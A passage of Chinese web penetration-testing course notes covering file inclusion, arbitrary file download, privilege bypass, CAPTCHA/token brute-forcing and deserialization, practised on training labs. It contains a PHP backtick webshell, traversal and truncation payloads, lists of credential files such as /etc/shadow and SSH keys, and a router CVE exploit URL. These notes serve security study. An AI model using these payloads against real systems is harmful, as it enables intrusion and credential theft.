根据源码解密之后</span><br><span class="line">        &lt;?php eval(echo `$_REQUEST[a]`;;) ?&gt;</span><br><span class="line">        反引号的作用</span><br><span class="line">        此处函数虽然用到了eval(),但在linux中包起来的内容会被系统命令执行</span><br><span class="line">            $ listc=`ls *.c` </span><br><span class="line">            $ echo $listc </span><br><span class="line">            main.c prog.c lib.c </span><br><span class="line">		head more tail tac都试试</span><br><span class="line">poc 验证漏洞是否存在</span><br><span class="line">exp	利用</span><br><span class="line"></span><br><span class="line">代码执行函数</span><br><span class="line">eval()					把字符串作为php代码执行</span><br><span class="line">assert()				断言	函数表达式</span><br><span class="line">call_user_func()		把第一参数作为回调函数</span><br><span class="line">call_user_func_array()	调用回到函数，并把第一个数组参数回到函数的参数</span><br><span class="line">array_map()				为数组每个圆度应用回调函数</span><br><span class="line">命令执行函数</span><br><span class="line">system()				执行外部程序并显示输出</span><br><span class="line">exec()					执行一个外部程序</span><br><span class="line">shell_exec()			通过shell环境执行命令，并将完整的输出以自渡川的方式返回</span><br><span class="line">passthru()				执行外命令并显示原始输出</span><br><span class="line">pcntl_exec()			在当前进程空间执行执行程序</span><br><span class="line">``反引号</span><br></pre></td></tr></table></figure>

<h3 id="day31-文件操作之文件包含漏洞漏洞全解"><a href="#day31-文件操作之文件包含漏洞漏洞全解" class="headerlink" title="day31-文件操作之文件包含漏洞漏洞全解"></a>day31-文件操作之文件包含漏洞漏洞全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#文件包含漏洞各个脚本代码</span><br><span class="line">ASP,PHP,JSP,ASPX</span><br><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;			#jsp包含远程地址</span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;					#jsp包含本地文件</span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;					#</span><br><span class="line">&lt;?php include(&#x27;test.php&#x27;)?&gt;</span><br><span class="line"></span><br><span class="line">检测	白盒	代码审计</span><br><span class="line">	 黑盒  漏洞扫描工具</span><br><span class="line">	 	  公开漏洞</span><br><span class="line">	 	  手工看参数值及功能点</span><br><span class="line">类型	本地包含	有无限制</span><br><span class="line">	 远程包含	 有无限制</span><br><span class="line">利用	   http</span><br><span class="line">		ftp</span><br><span class="line">		file</span><br><span class="line">		各种脚本支持协议</span><br><span class="line">修复	   固定后缀</span><br><span class="line">		固定文件</span><br><span class="line">		WAF产品</span><br><span class="line"></span><br><span class="line">固定后缀绕过</span><br><span class="line">	1.%00截断		条件：magic_quote_gpc=Off php版&lt;5.3.4</span><br><span class="line">	2.长度截断		条件windows，点号长于256；linux点号长于4096</span><br><span class="line">		/./././././././....</span><br><span class="line"></span><br><span class="line">php中 allow_url_include=on表示支持远程包含</span><br><span class="line">php伪协议			*****</span><br><span class="line">	https://www.cnblogs.com/endust/p/11804767.html</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667118163978.png" alt="1667118163978"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667131487703.png" alt="1667131487703"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf 爱春秋</span><br><span class="line">	https://www.ichunqiu.com/battalion</span><br></pre></td></tr></table></figure>

<h3 id="day32-文件操作之文件下载读取全解"><a href="#day32-文件操作之文件下载读取全解" class="headerlink" title="day32-文件操作之文件下载读取全解"></a>day32-文件操作之文件下载读取全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.文件被解析		文件包含漏洞</span><br><span class="line">2.显示源代码		文件读取漏洞</span><br><span class="line">3.提示文件下载	文件下载漏洞</span><br><span class="line"></span><br><span class="line">#文件下载</span><br><span class="line">产生		任意语言代码下载功能函数</span><br><span class="line">检测 白盒	代码审计</span><br><span class="line">	黑盒		漏扫工具</span><br><span class="line">			公开漏洞</span><br><span class="line">			手工看参数及功能点（资源下载）</span><br><span class="line">利用		常见文件	后台首页日志等可见文件</span><br><span class="line">   	敏感文件	数据库配置文件</span><br><span class="line">               各种接口文件</span><br><span class="line">               密钥信息文件</span><br><span class="line">修复	部署WAF产品</span><br><span class="line">	固定目录或过跨目录符号</span><br><span class="line">	目录权限设置或单独文件权限设置</span><br><span class="line"></span><br><span class="line">#文件读取</span><br><span class="line">产生		任意语言代码获取功能函数</span><br><span class="line">		检测		手工看参数值及功能点（资源获取）</span><br><span class="line">		利用</span><br><span class="line">		修复</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">pikachu</span><br><span class="line">	有下载的地方复制链接判断</span><br><span class="line">	http://192.168.88.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br><span class="line">	&amp;readpath &amp;filepath &amp;path &amp;inputfile &amp;url &amp;data &amp;readfile &amp;menu META-INF WEB-INF</span><br><span class="line">	../ ..\ .\ ./</span><br><span class="line">	%00 ? %23 %20 .</span><br><span class="line"></span><br><span class="line">javaweb例子</span><br><span class="line">	https://blog.csdn.net/Cheng_May/article/details/78600833</span><br><span class="line">[RoarCTF 2019]Easy Java1</span><br><span class="line">	javaweb get改post可以下载</span><br><span class="line">	读取javaweb配置文件</span><br><span class="line">		WEB-INF/web.xml		记录网站相关信息</span><br><span class="line">		抓包看，用火狐有bug不会改</span><br><span class="line">		先看WEB-INF/web.xml了更具/FLAG结合java开发只是获取文件路径，最后base64解码</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667186872660.png" alt="1667186872660"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667187240809.png" alt="1667187240809"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql 配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php 配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql 配置信息</span><br><span class="line">C:\Windows\win.ini //Windows 系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_ras.keystore</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP 配置文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/my.cnf //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache 配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql 历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的 cmdline 参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-18371		小米路由器远程任意文件读取漏洞</span><br><span class="line">	http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</span><br></pre></td></tr></table></figure>

<h3 id="day33-逻辑越权之水平垂直越权全解"><a href="#day33-逻辑越权之水平垂直越权全解" class="headerlink" title="day33-逻辑越权之水平垂直越权全解"></a>day33-逻辑越权之水平垂直越权全解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">水平：通过更换的某个ID之类的身份标识，从而使A账号获取（修改、删除）B账号数据</span><br><span class="line">垂直：使用低权限身份账号发送高权限账号才能有的请求，获得其高权限的操作</span><br><span class="line">未授权访问：通过删除请求中的认证信息后重放该请求，一九一可以访问或者完成操作</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pikachu垂直越权</span><br><span class="line">	普通用户使用管理员的cookie登录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场--身份认证失效实战</span><br><span class="line">	burp一步一步forward</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpsuite的anthz插件</span><br></pre></td></tr></table></figure>

<h3 id="day34-逻辑越权之登录脆弱及支付篡改"><a href="#day34-逻辑越权之登录脆弱及支付篡改" class="headerlink" title="day34-逻辑越权之登录脆弱及支付篡改"></a>day34-逻辑越权之登录脆弱及支付篡改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#爆破字典</span><br><span class="line">	github.com/huyuanzhi2/password_brute_dictionary</span><br><span class="line">还是代码审计</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#商品购买流程</span><br><span class="line">选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</span><br><span class="line"></span><br><span class="line">#常见篡改参数</span><br><span class="line">商品编号ID 购买价格 购买数量 支付方式 订单号 支付状态</span><br><span class="line"></span><br><span class="line">#常见修改方式</span><br><span class="line">替代支付 重复支付 最小额支付 负数支付 溢出支付 优惠卷支付</span><br><span class="line"></span><br><span class="line">支付接口</span><br><span class="line">	一般都是调用第三方支付接口，打的严不好自己搭建</span><br><span class="line"></span><br><span class="line">数据包唯一性</span><br><span class="line"></span><br><span class="line">还是代码审计</span><br></pre></td></tr></table></figure>

<h3 id="day35-逻辑越权之找回机制及接口安全"><a href="#day35-逻辑越权之找回机制及接口安全" class="headerlink" title="day35-逻辑越权之找回机制及接口安全"></a>day35-逻辑越权之找回机制及接口安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#找回重置机制</span><br><span class="line">	客户端回显 response状态值 验证码爆破 找回流程绕过</span><br><span class="line"></span><br><span class="line">#接口调用乱用</span><br><span class="line">	短信轰炸，来单轰炸</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#墨者靶场 登录密码重置漏洞分析溯源</span><br><span class="line">抓包一步一步forward 		这个很lao</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#客户端回显</span><br><span class="line">	#www.08=712zpw.com		打不开</span><br><span class="line">	邮箱验证码在客户端发送请求抓包直接看的到</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#response状态值</span><br><span class="line">	如果验证是在前端，可以通过burp抓取服务器发给前端的数据包</span><br><span class="line">	右键-&gt;do intercept-&gt;response to this request</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#自动识别验证码</span><br><span class="line">	有工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#短信轰炸</span><br><span class="line">	调用接口</span><br></pre></td></tr></table></figure>

<h3 id="day36-逻辑越权之验证码与token及接口"><a href="#day36-逻辑越权之验证码与token及接口" class="headerlink" title="day36-逻辑越权之验证码与token及接口"></a>day36-逻辑越权之验证码与token及接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">token	爆破</span><br><span class="line">		回显</span><br><span class="line">		固定</span><br><span class="line">验证码	  爆破</span><br><span class="line">		识别</span><br><span class="line">		复用</span><br><span class="line">		回显</span><br><span class="line">		绕过</span><br><span class="line"></span><br><span class="line">#验证码工具</span><br><span class="line">	PKav_Http_Fuzz		老工具集成好的，只能换库</span><br><span class="line">	captcha-killer		burp插件</span><br><span class="line">		github.com/c0ny1/captcha-killer/releases/tag/0.1.2</span><br><span class="line">		使用的话网上找博客</span><br><span class="line">	reCAPTCHA			插件老版</span><br><span class="line">		https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#pikachu靶场  on server</span><br><span class="line">	发两次包都通过了验证码测试---》验证码复用</span><br><span class="line">#pikachu靶场	on client</span><br><span class="line">	本地验证 抓包</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">token	每次刷新网页都会自动生成</span><br><span class="line">#pikachu靶场	token前端生成 配合burp绕过</span><br><span class="line">抓包 attack type选择pitchfork</span><br><span class="line">payloads</span><br><span class="line">	payload set:1,添加密码包含123456</span><br><span class="line">	payload set:2</span><br><span class="line">		options:设置线程为1</span><br><span class="line">			redirections：always</span><br><span class="line">			grep-Extract:选中token 会自动正则匹配</span><br><span class="line">		Payloads：</span><br><span class="line">			payload type:选择recurisive grep</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpsuite spider是爬虫</span><br></pre></td></tr></table></figure>

<h3 id="day37-反序列化之PHP-amp-JAVA全解-上"><a href="#day37-反序列化之PHP-amp-JAVA全解-上" class="headerlink" title="day37-反序列化之PHP&amp;JAVA全解(上)"></a>day37-反序列化之PHP&amp;JAVA全解(上)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化 将对象转换成字符串。</span><br><span class="line">反序列化相反 数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">    序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">        O:代表<span class="keyword">object</span></span><br><span class="line">        <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        <span class="number">4</span>:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        <span class="number">7</span>:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;constrct&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;创建变量&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;序列化&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$bbb</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//反序列化在网页脚本编译结束时会调用类函数__destruct()&lt;br&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1667552607007.png" alt="1667552607007"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">===	同时比较类型和值</span><br><span class="line">==	比较值</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/20175211lyz/p/11403397.html</span><br></pre></td></tr></table></figure>

<h3 id="day38-反序列化之PHP-amp-JAVA全解下"><a href="#day38-反序列化之PHP-amp-JAVA全解下" class="headerlink" title="day38-反序列化之PHP&amp;JAVA全解下"></a>day38-反序列化之PHP&amp;JAVA全解下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用	</span><br><span class="line">	payload生成器</span><br><span class="line">		ysoserial</span><br><span class="line">	自定义检测工具或脚本</span><br><span class="line">检测</span><br><span class="line">	黑盒</span><br><span class="line">		数据格式点</span><br><span class="line">			http请求参数</span><br><span class="line">			自定义协议</span><br><span class="line">			RMI协议</span><br><span class="line">			子主题</span><br><span class="line">		特定扫描</span><br><span class="line">			见利用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java中API实现</span><br><span class="line">位置 java.io.ObjectOutputStream java.io.ObjectInputStream</span><br><span class="line">序列化</span><br><span class="line">	ObjectOutStream类--&gt;writeObject()</span><br><span class="line">	该方法对参数指定的obj对象进行序列化，把字节序列写道一个目标输出流中，按java的标准约定时给文件一个.ser扩展名</span><br><span class="line">反序列化</span><br><span class="line">	ObjectInputStream类--&gt;readObject()</span><br><span class="line">	该方法从一个源输入中读取字节序列，再把它们反序列化为一个对象，并将其返回</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#javaweb靶场			webgoat</span><br><span class="line">	https://github.com/WebGoat/WebGoat/releases</span><br></pre></td></tr></table></figure>

<h3 id="day39"><a href="#day39" class="headerlink" title="day39-"></a>day39-</h3><h3 id="day40"><a href="#day40" class="headerlink" title="day40-"></a>day40-</h3><h3 id="day41"><a href="#day41" class="headerlink" title="day41-"></a>day41-</h3><h3 id="day42-操作系统之漏洞探针类型利用修复"><a href="#day42-操作系统之漏洞探针类型利用修复" class="headerlink" title="day42-操作系统之漏洞探针类型利用修复"></a>day42-操作系统之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">操作系统</span><br><span class="line">	探针</span><br><span class="line">		Goby Nmap Nessus OpenVAS Nexpose</span><br><span class="line">	类型</span><br><span class="line">		远程执行 权限提升 缓存区溢出</span><br><span class="line">	利用</span><br><span class="line">		工具框架</span><br><span class="line">			Metasploit Searchsploit 企业单位内部产品</span><br><span class="line">		单点EXP</span><br><span class="line">			cnvd seebug 1337day exploit-db Packetstorm_Security</span><br><span class="line">		复现文章</span><br><span class="line">			各种咨询来源</span><br><span class="line">	修复</span><br><span class="line">		打上补丁 关闭入口 防护应用</span><br><span class="line">	补充</span><br><span class="line">		系统漏洞发现意义?</span><br><span class="line">		漏洞类型危害情况?</span><br><span class="line">		如何做好未卜先知?</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">演示了goby nmap nessus漏洞探测的使用</span><br><span class="line">	小迪比较推崇nessus</span><br><span class="line">kali的/usr/share/nmap/scripts中包含了nse插件库</span><br><span class="line">	nmap --scripts=vuln	使用默认nse插件</span><br><span class="line">	nmap vulscan vulners使用第三方探针</span><br><span class="line">		https://www.cnblogs.com/shwang/p/12623669.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#名词解释</span><br><span class="line">CVSS	Common Vulnerability Scaning System	通用漏洞评分系统</span><br><span class="line">CVE		Common Vulnerability and Exposures</span><br><span class="line">其他漏洞编号 MS MSKB CERT BID IAVM OVAL</span><br><span class="line">EXP		利用</span><br><span class="line">POC		检测</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#利用</span><br><span class="line">cnvd 	国家信息安全漏洞共享平台China National Vulnerability Database</span><br><span class="line">seebug</span><br><span class="line">1337day		0day.today		cloudflare   ip被禁了  扫到的泛播</span><br></pre></td></tr></table></figure>

<h3 id="day43-web之漏洞探针类型利用修复"><a href="#day43-web之漏洞探针类型利用修复" class="headerlink" title="day43-web之漏洞探针类型利用修复"></a>day43-web之漏洞探针类型利用修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#已知CMS</span><br><span class="line">如常见的dedecms discuz wordpress等源码结构，使用网上公开源码搭建网站，可利用公开漏洞进行测试，或者白盒审计</span><br><span class="line">	可以使用cmsscan wpscan joomscan drupalscan探测工具框架</span><br><span class="line">	代码审计</span><br><span class="line">		函数点 功能点 框架类挖掘</span><br><span class="line">#开发框架</span><br><span class="line">thinkphp spring flask</span><br><span class="line">#未知cms</span><br><span class="line">常见的企业或个人内部程序源码，也可以是某CMS二次开发的源码结构</span><br><span class="line"></span><br><span class="line">开发框架</span><br><span class="line">	php</span><br><span class="line">		Yii Laravel 